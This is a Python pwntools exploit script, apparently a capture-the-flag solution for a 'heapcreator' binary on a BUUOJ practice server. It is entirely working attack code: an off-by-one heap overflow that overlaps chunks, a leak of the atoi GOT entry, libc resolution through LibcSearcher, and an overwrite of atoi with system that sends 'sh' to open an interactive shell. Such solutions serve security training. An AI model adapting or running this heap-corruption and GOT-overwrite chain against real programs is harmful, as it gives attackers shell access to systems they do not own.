from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './heapcreator'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',29924) if argv[1]=='r' else process(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# start
def add(len,content='a'):
    sla(':','1')
    sla(':',str(len))
    sa(':',content)

def show(index):
    sla(':','3')
    sla(':',str(index))

def edit(index,content):
    sla(':','2')
    sla(':',str(index))
    sa(':',content)

def delete(index):
    sla(':','4')
    sla(':',str(index))

add(0x18) # 0
add(0x10) # 1
edit(0,'a'*0x18+'\x41')
delete(1)

# new heap->content = heap1->ptr
# new heap->ptr = heap1->content
add(0x30,flat(0,0,0,0,0x30,elf.got['atoi']))
show(1)
ru('Content : ')
atoi = uu64(r(6))
system,binsh = ret2libc(atoi,'atoi')
edit(1,p64(system))
sla('choice :','sh\x00\x00')
# end

itr()